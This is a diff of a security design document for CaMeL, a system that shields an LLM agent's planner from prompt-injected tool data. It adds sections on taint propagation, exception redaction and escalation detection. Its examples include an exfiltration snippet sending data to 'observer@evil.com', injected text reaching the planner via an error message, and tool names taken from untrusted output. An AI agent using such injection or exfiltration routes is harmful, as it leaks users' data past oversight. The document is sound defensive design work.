@@ -1,13 +1,17 @@
 # CaMeL Security Hardening Design Document
-# Module & Builtin Allowlist Enforcement (M4-F10 – F14)
 
-_Author: Software Architect | Date: 2026-03-17_
-_Status: Published — gates Milestone 4 allowlist implementation sprint_
-_Related: `docs/milestone4_design.md §3`, `camel/config/allowlist.yaml`, PRD §6.3, §7.3, NFR-1_
+**Version:** 1.4 (Milestone 4 — Complete)
+**Date:** 2026-03-17
+**Author:** Software Architect
+
+_Status: Published — all Milestone 4 hardening phases delivered and verified_
+_Related: `docs/milestone4_design.md`, `docs/architecture.md §10`, `camel/config/allowlist.yaml`, PRD §6.3, §7.3, NFR-1_
 
 ---
 
 ## Table of Contents
+
+**Part I — Module & Builtin Allowlist Enforcement (M4-F10 – F14)**
 
 1. [Purpose & Scope](#1-purpose--scope)
 2. [Threat Model](#2-threat-model)
@@ -19,7 +23,28 @@ _Related: `docs/milestone4_design.md §3`, `camel/config/allowlist.yaml`, PRD §
 8. [Central Configuration & Review Gate (M4-F13)](#8-central-configuration--review-gate-m4-f13)
 9. [Residual Risks](#9-residual-risks)
 10. [Rejected Builtins — Exclusion Decisions](#10-rejected-builtins--exclusion-decisions)
-11. [Audit Trail](#11-audit-trail)
+
+**Part II — STRICT Mode Design Decisions (M4-F1 – F5)**
+
+11. [STRICT Mode Security Rationale](#11-strict-mode-security-rationale)
+12. [STRICT Mode Propagation Rule Design Decisions](#12-strict-mode-propagation-rule-design-decisions)
+
+**Part III — Exception Redaction Design (M4-F6 – F9, M4-F17)**
+
+13. [Exception Redaction Architecture](#13-exception-redaction-architecture)
+14. [Redaction Design Decisions](#14-redaction-design-decisions)
+
+**Part IV — Escalation Detection Design (M4-F15, M4-F16, M4-F18)**
+
+15. [Data-to-Control-Flow Escalation Detection Design](#15-data-to-control-flow-escalation-detection-design)
+
+**Part V — Residual Risk Register**
+
+16. [Consolidated Residual Risk Register](#16-consolidated-residual-risk-register)
+
+**Appendix**
+
+17. [Audit Trail](#17-audit-trail)
 
 ---
 
@@ -586,7 +611,297 @@ review gate if concrete, low-risk use cases arise:
 
 ---
 
-## 11. Audit Trail
+---
+
+## Part II — STRICT Mode Design Decisions (M4-F1 – F5)
+
+---
+
+## 11. STRICT Mode Security Rationale
+
+STRICT mode closes a class of side-channel attacks that NORMAL mode cannot address.
+In NORMAL mode, dependencies are recorded only through direct data assignment — control-flow
+constructs (`if`, `for`) and Q-LLM calls do not add dependency edges.  This leaves three
+observable vectors open:
+
+| Vector | Observable channel | STRICT mode closure |
+|---|---|---|
+| **Branch-observation channel** | Which branch is taken (true vs false) is observable via downstream tool calls. If `if secret: send_a() else: send_b()`, an observer infers the secret from which tool fires. | M4-F2: `if` condition's deps merged into all assignments in both branches; downstream tool calls carry the condition's taint and are blocked by policy. |
+| **Loop-iteration-count channel** | Number of loop iterations is observable as total execution time or total tool call count. If `for item in secret_list: process(item)`, an observer infers `len(secret_list)`. | M4-F1: Iterable's deps merged into all loop-body assignments; any tool call using loop-derived data carries the iterable's taint. |
+| **Q-LLM data-to-assignment channel** | Assignments following a Q-LLM call may be transitively influenced by the Q-LLM's output without directly referencing it; in NORMAL mode these assignments do not carry the Q-LLM's taint. | M4-F3/F4: All assignments following `query_quarantined_llm()` in the same block inherit the Q-LLM result's capabilities as additional context dependencies. |
+
+**Design principle:** STRICT mode errs on the side of false positives (over-tainting) rather
+than false negatives (under-tainting).  A policy denial from an over-tainting scenario produces
+a user consent prompt; an under-tainting scenario produces a silent security bypass.  The
+asymmetry justifies STRICT mode as the default.
+
+**Default mode rationale (M4-F5):** STRICT mode is the `CaMeLInterpreter` constructor default
+as of v0.4.0.  New deployments automatically benefit from these protections without requiring
+explicit configuration.  The opt-in for NORMAL mode requires passing `mode=ExecutionMode.NORMAL`
+and is documented as appropriate only for debugging or non-security-sensitive scenarios.  Security
+deployments must never opt out without explicit risk acceptance.
+
+---
+
+## 12. STRICT Mode Propagation Rule Design Decisions
+
+### 12.1 M4-F1 — For-Loop Iterable Propagation
+
+**Decision:** Merge the iterable's full capability set and dependency set into every assignment
+inside the loop body, including nested blocks.
+
+**Alternative considered:** Merge only into the loop target variable (e.g., `item` in `for item in list`).
+
+**Rejection rationale:** Merging into only the loop target is insufficient.  Consider:
+
+```python
+for item in untrusted_list:
+    result = compute(item)     # directly references item → carries taint (both modes)
+    label = "fixed_label"      # does not reference item → would be clean in NORMAL mode
+    send_email(to=label, body=result)
+```
+
+In NORMAL mode, `label = "fixed_label"` carries no taint.  But `label`'s *assignment* is
+inside the loop, which means its use in `send_email` occurs during every iteration controlled
+by `untrusted_list`.  An adversary who controls `untrusted_list` controls how many times
+`send_email` fires — the iteration count itself is a covert channel.  M4-F1 propagates the
+iterable's taint to all loop-body assignments, closing this vector.
+
+**Scope:** Applies in STRICT mode only.
+
+### 12.2 M4-F2 — If/Else Test Propagation
+
+**Decision:** Merge the condition's capability set and dependency set into every assignment
+in both the `body` and `orelse` branches.
+
+**Alternative considered:** Merge into only the `body` branch (not `orelse`).
+
+**Rejection rationale:** Propagating to `body` only is insufficient for adversarial scenarios
+where the `else` branch carries the observable outcome.  Consider:
+
+```python
+if secret_flag:
+    x = "trusted_a"
+else:
+    x = "trusted_b"   # ← only this fires when secret_flag=False
+send_email(to="observer@evil.com", body=x)
+```
+
+Both `x = "trusted_a"` and `x = "trusted_b"` are in source code; the *choice* of which fires
+is controlled by `secret_flag`.  Without tainting the `orelse` branch, `x` in the false case
+would carry no taint and bypass the policy engine.  M4-F2 taints all assignments in both branches.
+
+**Scope:** Applies in STRICT mode only.
+
+### 12.3 M4-F3/F4 — Post-Q-LLM Remainder Propagation
+
+**Decision:** After any `query_quarantined_llm()` call in a statement list, all subsequent
+assignments in the same `_exec_statements` frame inherit the Q-LLM result's capabilities.
+The flag resets on block exit (M4-F4).
+
+**Design rationale:** The Q-LLM processes untrusted tool data and returns structured but
+still-untrusted results.  Assignments that follow the Q-LLM call in the same block may not
+directly reference the Q-LLM result variable but may be transitively influenced by it (e.g.,
+a conditional that tests the Q-LLM result drives which subsequent assignments occur).
+M4-F3/F4 ensures that any tool call made after a Q-LLM invocation within the same block
+carries the Q-LLM's taint, surfaced to the policy engine for approval.
+
+**Block scope:** The "remainder flag" is scoped to the current `_exec_statements` invocation.
+It does not leak into called functions or sibling blocks.  This prevents over-tainting of
+code that is structurally separated from the Q-LLM call.
+
+---
+
+## Part III — Exception Redaction Design (M4-F6 – F9, M4-F17)
+
+---
+
+## 13. Exception Redaction Architecture
+
+The exception redaction engine (`ExceptionRedactor` in `camel/execution_loop.py`) is the
+component responsible for deciding which exception information is safe to forward to the
+P-LLM in the retry prompt.
+
+### 13.1 Attack Vector Addressed
+
+Without redaction, an adversary can craft tool return values that, when processed by the
+interpreter, trigger exceptions whose messages echo the adversary-controlled content.  The
+retry prompt forwards this exception message to the P-LLM — crossing the untrusted/trusted
+boundary and potentially leaking the adversary's payload.
+
+Example:
+```python
+email_body = read_email()   # adversary-controlled
+result = int(email_body)    # ValueError: "invalid literal: 'INJECT HERE'"
+                            # → without redaction, "INJECT HERE" reaches the P-LLM
+```
+
+### 13.2 Redaction Decision Algorithm
+
+The `ExceptionRedactor.classify()` method implements the following decision tree:
+
+```
+1. If isinstance(exc, NotEnoughInformationError):
+   → Always redact: forward only error type and call-site lineno (M4-F7)
+   → Never include Q-LLM reasoning about why information was insufficient
+
+2. Else: walk the dependency graph for the failing statement's variables
+   → Collect all upstream sources for each referenced variable
+   → If any upstream source is outside TRUSTED_SOURCES = {"User literal", "CaMeL"}:
+       → Redact: forward only error type and lineno (M4-F6)
+   → Otherwise:
+       → Trust: forward full error type, lineno, and message
+
+3. Always emit a RedactionAuditEvent to the security audit log (M4-F17)
+```
+
+### 13.3 Design Choice: Dependency-Graph-Aware vs Store-Wide Scan
+
+**Decision (M4-F6):** Inspect only the variables referenced in the *failing statement*
+(and their transitive upstream), not the entire interpreter store.
+
+**Rationale:** A store-wide scan would over-redact — any trusted exception in a plan that
+happens to have some unrelated untrusted variable in store would be redacted, preventing
+the P-LLM from seeing useful error messages.  The statement-level scope is more precise:
+only if the exception-triggering code touched untrusted data does the message get redacted.
+
+**Conservative bias retained:** Within the statement scope, the full transitive upstream
+is inspected (not just direct sources).  This ensures that taint propagated through several
+hops of computation is still caught.
+
+---
+
+## 14. Redaction Design Decisions
+
+### 14.1 M4-F7 — NEIE Content Stripping
+
+**Decision:** `NotEnoughInformationError` content is always stripped.  Only the error
+type name and the call-site line number are forwarded to the P-LLM.
+
+**Rationale:** The Q-LLM's "not enough information" message would describe what was
+missing from the tool's response.  Since the tool response is untrusted, the absence
+description is adversary-influenceable.  An adversary could craft tool responses that
+produce specific NEIE messages, using the NEIE path as a covert channel back to the P-LLM.
+
+### 14.2 M4-F8 — Annotation Preservation Across NEIE
+
+**Decision:** Before triggering P-LLM regeneration on NEIE, the interpreter snapshots
+its `DependencyGraph` and `_dep_ctx_stack`.  After the regenerated plan is received,
+the snapshot is restored before execution.
+
+**Rationale:** Without this preservation, the STRICT mode taint accumulated before the
+failing Q-LLM call (e.g., taint from a prior `for` loop over an untrusted iterable)
+would be silently dropped across the retry cycle.  The regenerated plan's new assignments
+would start with a clean dependency context, potentially allowing untrusted-tainted data
+to flow to tool arguments without detection.
+
+### 14.3 M4-F9 — Loop-Body Exception Propagation
+
+**Decision:** When an exception originates inside a `for`-loop body with a non-public
+iterable in STRICT mode, the iterable's dependency set is attached to the exception
+as `__loop_iter_deps__` and pre-seeded into the regenerated plan's dep context.
+
+**Rationale:** Symmetric with M4-F8 — ensures the iterable's taint is never silently
+dropped across exception-triggered retry cycles, just as M4-F8 ensures Q-LLM taint
+is never dropped across NEIE-triggered cycles.
+
+---
+
+## Part IV — Escalation Detection Design (M4-F15, M4-F16, M4-F18)
+
+---
+
+## 15. Data-to-Control-Flow Escalation Detection Design
+
+### 15.1 Attack Vector Addressed
+
+In a well-formed CaMeL execution plan, all tool names are P-LLM-generated literals —
+trusted by construction.  The escalation attack exploits a scenario where the tool name
+is derived at runtime from untrusted data:
+
+```python
+tool_name = qllm_result.action_name   # untrusted source
+tool_name(...)                        # data-to-control escalation
+```
+
+This bypasses the P-LLM isolation guarantee: the adversary can now determine *which tool
+is called*, not just influence its arguments.
+
+### 15.2 M4-F15 — Detection Algorithm
+
+The detector fires at the start of `_eval_Call`, immediately after evaluating the `func`
+operand:
+
+1. Evaluate `func_cv = _eval_expr(node.func, ctx_caps)`.
+2. Compute `untrusted_sources = {s for s in func_cv.sources if s not in TRUSTED_SOURCES}`.
+3. Walk upstream dependency graph for the func variable to capture indirect escalation.
+4. If `untrusted_sources` is non-empty: construct `DataToControlFlowWarning` and invoke
+   the M4-F16 elevated consent gate.
+
+A literal tool name (e.g., `send_email(...)`) is resolved through `_eval_Name`, which
+wraps it with `sources=frozenset({"CaMeL"})` — trusted; no warning fired.
+
+### 15.3 M4-F16 — Elevated Consent Gate Design
+
+**Decision:** The elevated consent gate fires *before* `_policy_engine.evaluate()`.
+
+**Rationale:** Policy evaluation operates on the tool's arguments — it cannot detect
+that the tool's *identity* derives from untrusted data.  If the elevated consent gate
+fired after policy evaluation and a policy returned `Allowed`, the escalation would
+silently proceed without elevated scrutiny.  The pre-policy placement ensures elevated
+consent cannot be bypassed by a pre-existing `Allowed` policy outcome.
+
+**Secure default:** If no `elevated_consent_callback` is configured in PRODUCTION mode,
+the secure default (always reject) is applied.  This prevents misconfiguration from
+silently allowing escalations.
+
+**EVALUATION mode behaviour:** `DataToControlFlowEscalationError` is raised immediately,
+consistent with how `PolicyViolationError` behaves in EVALUATION mode.  This enables
+automated testing without UI interaction.
+
+### 15.4 M4-F18 — STRICT Mode Dependency Audit Events
+
+The `StrictDependencyAdditionEvent` provides post-execution observability into exactly
+which STRICT mode propagation rules fired and which dependencies were added by each rule.
+This supports:
+
+- **Security review:** Auditors can trace the provenance of every STRICT mode taint
+  addition and verify that the policy engine saw the correct dependency set.
+- **Debugging:** Developers can diagnose unexpected policy denials by inspecting which
+  STRICT mode propagation contributed the taint.
+- **Performance profiling:** Events are deduplicated per `(lineno, variable)` pair per
+  `exec()` call to prevent O(n) event floods in tight loops.
+
+---
+
+## Part V — Residual Risk Register
+
+---
+
+## 16. Consolidated Residual Risk Register
+
+_This register consolidates all documented residual risks from Milestone 4 across all
+four hardening phases.  It supersedes the per-section residual risk tables in §9 of
+this document and the milestone4_design.md §4.7._
+
+| Risk ID | Phase | Description | Severity | Mitigation Status | Reference |
+|---|---|---|---|---|---|
+| **R1** | Timing / Allowlist | **Indirect iteration-count channel:** Adversary-controlled loop count encodes a secret in total wall-clock execution duration without any explicit timing call. `for item in secret_list: expensive_op()` — the number of iterations (determined by `len(secret_list)`) is observable externally as execution time. | Medium | Partially addressed by STRICT mode M4-F1 (iterable's taint propagated to all loop-body assignments, ensuring the policy engine detects untrusted provenance). Wall-clock observability itself is not mitigated. | §5; architecture.md §10.5 NG4 |
+| **R2** | Timing / Allowlist | **CPython instruction-dispatch variance:** CPython's interpreter dispatch time varies by expression complexity and branch taken. A sufficiently precise external observer with a stable measurement channel could infer branch counts from micro-timing. | Low | Not mitigated. Acknowledged in PRD §10 L3 and §7.3. Mitigation would require constant-time interpreter implementation (FW-1). | §9; architecture.md §10.7 FW-1 |
+| **R3** | Timing / Allowlist | **Tool-implementation timing leakage:** Registered CaMeL tools may internally use timing-sensitive operations (e.g., database lookups proportional to secret size). | Medium | Out of scope for the allowlist layer. Tool implementers must apply constant-time techniques independently. | §9 |
+| **R4** | Timing / Allowlist | **OS-level process-time observation:** An OS-level attacker with access to `/proc/<pid>/stat` or equivalent can measure the agent process's CPU time, bypassing namespace exclusion. | Low | Out of scope. Assumes the host environment provides process isolation. | §9 |
+| **R5** | Timing / Allowlist | **Future allowlist additions:** A future security review that incorrectly admits a timing-related name could reintroduce timing channels. | Low | Mitigated by the mandatory review gate (§8.2) and the `assert permitted ∩ excluded = ∅` invariant check at startup. | §9 |
+| **R6** | Exception Redaction | **Deeply nested tool exception chains:** Exceptions propagating through multiple tool call frames before reaching the interpreter's exception handler may carry untrusted content from intermediary frames not captured in the immediate variable scope. | Low | M4-F6 dependency-graph-aware redaction addresses direct taint at the statement level. Deeply nested tool chains where intermediate frames have side effects remain a documented residual risk. | milestone4-exception-hardening.md §9.2 |
+| **R7** | Escalation Detection | **ROP-analogue action chaining:** An adversary chains individually-approved tool calls (each to a statically-named, trusted tool) to produce a collectively malicious outcome. M4-F15/F16 blocks single-step escalation but does not detect multi-step chaining. | Medium-High | Partially mitigated by STRICT mode (M4-F1/F2) ensuring all inner-block assignments carry correct taint. Full detection of collectively malicious call sequences requires future work (FW-6). | architecture.md §10.5 L6 |
+| **R8** | STRICT Mode | **STRICT mode opt-out risk:** A deployment that explicitly opts into NORMAL mode (`mode=ExecutionMode.NORMAL`) loses all STRICT mode propagation protections. The opt-in is documented but cannot be enforced at the language level. | Medium | Documented. STRICT mode is the default; NORMAL mode opt-in requires an explicit constructor argument. Security deployments must never opt out without explicit risk acceptance. | architecture.md §6 |
+
+**Assessment:** Risks R1 and R3 are the most operationally significant among the residual risks.
+R7 (ROP-analogue) is the highest severity and is the primary focus of future work (FW-6).
+All other risks are Low severity or are fully mitigated by the allowlist review gate or STRICT mode.
+
+---
+
+## 17. Audit Trail
 
 | Date | Author | Change | Reference |
 |---|---|---|---|
@@ -595,7 +910,8 @@ review gate if concrete, low-risk use cases arise:
 | 2026-03-17 | Backend Developer | `ForbiddenImportError`, `ForbiddenNameError`, `ConfigurationSecurityError` implemented in `camel/exceptions.py` | M4-F10, M4-F14, M4-F13 |
 | 2026-03-17 | Backend Developer | `AllowlistLoader`, `build_permitted_namespace()` implemented in `camel/config/loader.py` | M4-F13 |
 | 2026-03-17 | Backend Developer | Import interception (`_exec_Import`, `_exec_ImportFrom`) and name-lookup enforcement (`_eval_Name` updated) implemented in `camel/interpreter.py` | M4-F10, M4-F11, M4-F12, M4-F14 |
+| 2026-03-17 | Software Architect | Document expanded to full Security Hardening Design Document — added Part II (STRICT mode design decisions M4-F1–F5), Part III (exception redaction design M4-F6–F9, M4-F17), Part IV (escalation detection design M4-F15, M4-F16, M4-F18), Part V (consolidated residual risk register). Version bumped to 1.4. | Milestone 4 sprint (side-channel test suite & documentation publication) |
 
-_This document is the security-reviewed record for the M4-F10 – F14 feature cluster.
-Any future changes to `allowlist.yaml` or the enforcement logic must produce a new
-audit trail entry following the review gate process described in §8.2._
+_This document is the security-reviewed record for all Milestone 4 hardening phases (M4-F1 – F18).
+Any future changes to `allowlist.yaml` or the enforcement logic must produce a new audit trail
+entry following the review gate process described in §8.2._
